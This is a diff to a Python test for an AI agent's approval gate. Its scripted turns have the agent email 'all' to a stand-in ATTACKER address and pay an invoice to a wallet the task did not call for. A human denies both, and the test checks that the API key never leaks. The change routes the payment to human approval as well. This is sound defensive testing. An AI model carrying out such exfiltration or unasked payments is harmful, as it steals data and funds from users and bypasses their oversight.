@@ -264,8 +264,9 @@ def test_api_key_never_leaks(tmp_path, capsys, caplog):
              calls(call("send_email", to=ATTACKER, subject="archive", body="all")),
              calls(call("pay_invoice", invoice_id="INV-104", to=asst.SAM_WALLET, value_eth=0.02)),
              done()]
+    # "summarize" never asks to pay, so the payment also goes to the human (2026-10-01 rule)
     bot, gate, rv, asked, transport, data = setup(tmp_path, turns, task=asst.SKILLS["summarize"],
-                                                  answers=("n",))
+                                                  answers=("n", "n"))
     bot.log = print
     bot.run()
     assert all(r["headers"]["Authorization"] == f"Bearer {KEY}" for r in transport.requests)
